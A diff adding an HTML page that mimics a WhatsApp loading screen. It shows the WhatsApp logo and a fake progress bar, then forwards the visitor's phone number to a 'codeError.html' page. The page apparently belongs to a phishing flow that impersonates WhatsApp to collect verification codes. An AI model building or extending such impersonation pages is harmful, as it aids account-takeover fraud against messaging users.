@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Loading...</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" type="image/svg+xml">
+
+  <style>
+    body {
+      margin: 0;
+      background-color: #e8f5e9;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .logo {
+      width: 100px;
+      margin-bottom: 30px;
+    }
+
+    h1 {
+      color: #4CAF50;
+      margin-bottom: 30px;
+    }
+
+    .loading-bar {
+      width: 200px;
+      height: 6px;
+      background: #c8e6c9;
+      border-radius: 4px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .loading-bar::after {
+      content: "";
+      position: absolute;
+      height: 100%;
+      width: 0;
+      background: #4CAF50;
+      animation: loading 3s linear forwards;
+    }
+
+    @keyframes loading {
+      0% { width: 0; }
+      100% { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- WhatsApp logo -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" class="logo" />
+
+  <!-- Loading text -->
+  <h1>Loading, please wait...</h1>
+
+  <!-- Charging line -->
+  <div class="loading-bar"></div>
+
+  <!-- Redirect with phone param -->
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const phone = params.get("phone") || "Unknown";
+    setTimeout(() => {
+      window.location.href = `codeError.html?phone=${encodeURIComponent(phone)}`;
+    }, 3000);
+  </script>
+</body>
+</html>
